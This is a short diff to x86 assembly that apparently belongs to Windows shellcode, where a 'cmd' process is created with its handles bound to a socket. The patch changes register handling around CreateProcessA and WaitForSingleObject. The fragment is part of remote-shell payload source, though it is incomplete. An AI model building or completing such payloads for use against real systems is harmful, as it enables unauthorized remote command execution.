@@ -56,7 +56,8 @@
       push	esi         ; "cmd" pointer
       push	ecx         ; NULL
 
-      xchg	edx, edi    ; restore edi to socket fd.
+      mov	esi, edi    ; Back-up edi in esi
+      xchg	edx, edi    ; restore edi to socket fd. ("standard" API)
   LCreateProcessA:
 %if %1 == 1
       push dword [ebp] ; kernel32.dll
@@ -66,7 +67,6 @@
 %else
       call FN_CREATEPROCESS
 %endif
-      mov esi, esp
       
   LWaitForSingleObject:
 %if %1 == 1
@@ -76,7 +76,7 @@
 %endif
 
       push byte 0xff	; dwMilliseconds (infinite)
-      push dword [esi]	; Process Handle
+      push dword [edi]	; Process Handle
 %if %1 == 1
       call eax
 %else
